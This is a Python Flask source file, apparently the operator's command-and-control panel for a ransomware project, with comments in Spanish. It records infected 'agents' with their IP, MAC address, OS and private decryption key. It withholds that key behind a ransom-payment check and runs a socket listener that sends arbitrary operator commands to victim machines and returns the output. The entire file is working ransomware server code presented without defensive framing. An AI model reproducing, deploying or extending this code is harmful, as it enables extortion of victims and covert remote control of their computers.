from flask import Flask, render_template, request, jsonify, send_file, redirect, url_for, session, flash
from io import BytesIO
import socket, threading
from database.database import init_db, get_db_connection

app = Flask(__name__)
app.secret_key = "supersecreto" 
app.config['SESSION_PERMANENT'] = False  # Sesión no permanente
app.config['SESSION_COOKIE_PERMANENT'] = False  # No mantener la cookie de sesión

init_db()  # Inicializar la base de datos al iniciar la app
agents = []
connected_agents = {}  # Diccionario para almacenar las conexiones de agentes activas

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        conn = get_db_connection()
        c = conn.cursor()
        c.execute("SELECT * FROM users WHERE username = ? AND password = ?", (username, password))
        user = c.fetchone()
        conn.close()

        if user:
            session['user'] = username  # Guardar usuario en sesión
            return redirect(url_for('index'))  # Redirigir al dashboard
        else:
            flash("Usuario o contraseña incorrectos", "error")

    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect(url_for('login'))

@app.route('/') # Ruta principal 
def index():
    if 'user' not in session:  # Verificar si el usuario está logueado
        return redirect(url_for('login'))
    
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4], 'timestamp': row[5]} for row in c.fetchall()]
    conn.close()
    
    return render_template('index.html', agents=agents)

@app.route('/register_agent', methods=['POST'])  
def register_agent():
    ip = request.form.get('ip')
    mac = request.form.get('mac')
    so = request.form.get('so')
    timestamp = request.form.get('timestamp')
    private_key_file = request.files.get('private_key')

    if not ip or not mac or not so or not timestamp or not private_key_file:
        return jsonify({'error': 'Faltan IP, MAC, SO, timestamp o clave privada'}), 400

    private_key_content = private_key_file.read().decode('utf-8')

    # Guardar agente en la base de datos
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('''INSERT INTO agents (ip, mac, so, private_key, timestamp) 
                 VALUES (?, ?, ?, ?, ?)''', (ip, mac, so, private_key_content, timestamp))
    agent_id = c.lastrowid  # Recuperar el ID generado automáticamente
    conn.commit()
    conn.close()
    # Devolver el agent_id en formato JSON
    return jsonify({'message': 'Agente registrado con éxito', 'agent_id': agent_id}), 200

@app.route('/pay_agent/<int:agent_id>')
def pay_agent(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute("UPDATE agents SET pay_status = TRUE WHERE id = ?", (agent_id,))
    conn.commit()
    # Si el agente tiene una conexión activa, cerrarla
    if agent_id in connected_agents:
        agent_socket = connected_agents.pop(agent_id)
        agent_socket.close()
        print(f"Conexión con el agente {agent_id} cerrada tras pago.")
    # Recuperar la lista actualizada de agentes
    c.execute('SELECT id, ip, mac, so, pay_status, timestamp FROM agents')
    agents = [{'id': row[0], 'ip': row[1], 'mac': row[2], 'so': row[3], 'pay_status': row[4],'timestamp': row[5]} for row in c.fetchall()]
    conn.close()

    return render_template('index.html', agents=agents)

@app.route('/view_private_key/<int:agent_id>', methods=['GET'])  # Visualizar clave privada
def view_private_key(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT private_key FROM agents WHERE id = ?', (agent_id,))
    agent = c.fetchone()
    conn.close()

    if not agent:
        return jsonify({'error': 'Agente no encontrado'}), 404
    
    return render_template('view_key.html', private_key=agent[0])

@app.route('/download_private_key/<int:agent_id>', methods=['GET'])  # Descargar la clave privada
def download_private_key(agent_id):
    conn = get_db_connection()
    c = conn.cursor()
    c.execute('SELECT private_key, pay_status FROM agents WHERE id = ?', (agent_id,))
    agent = c.fetchone()
    conn.close()
    if not agent:
        return jsonify({'error': 'Agente no encontrado'}), 404
    private_key, pay_status = agent
    if not pay_status:
        return jsonify({'error': 'Paga el rescate para descargar la clave'}), 403
    private_key_io = BytesIO(private_key.encode('utf-8'))
    return send_file(private_key_io, as_attachment=True, download_name="rsa_private.pem", mimetype='application/x-pem-file')

@app.route('/execute_command/<int:agent_id>', methods=['GET', 'POST'])
def execute_command(agent_id):
    output = None
    if request.method == 'POST':
        command = request.form.get('command')
        print(f"Recibiendo comando para el agente {agent_id}: {command}")
        # Verificar si el agente está conectado
        if agent_id in connected_agents:
            agent_socket = connected_agents[agent_id]
            # Si el comando es 'exit', cerramos la conexión
            agent_socket.send(command.encode())
            if command == 'exit':
                agent_socket.close()
                connected_agents.pop(agent_id, None)  # Eliminar agente de la lista
                output = f"Conexión con el agente {agent_id} cerrada."
            else:
                # Enviar el comando al agente y esperar la respuesta
                response = agent_socket.recv(4096)
                output = response.decode()
        else:
            output = "Agente no conectado."
    return render_template('execute_commands.html', agent_id=agent_id, output=output)

def start_socket_server(host='0.0.0.0', port=5001):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Servidor de sockets escuchando en {host}:{port}...")
    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Conexión desde {client_address}")
        try: 
        # Recibir el ID del agente al inicio de la conexión
            agent_id = int(client_socket.recv(1024).decode('utf-8'))
        # Registrar al agente en la lista de agentes conectados
            connected_agents[agent_id] = client_socket
            print(f"Agente {agent_id} conectado.")
        except Exception as e:
            print(f"Error al recibir datos del agente: {e}")
  
if __name__ == '__main__':
    # Iniciar el servidor de sockets en un hilo separado
    threading.Thread(target=start_socket_server, args=('0.0.0.0', 5001), daemon=True).start()  
    # Iniciar el servidor Flask
    app.run(debug=True, host="0.0.0.0", port=5000, use_reloader=False)

    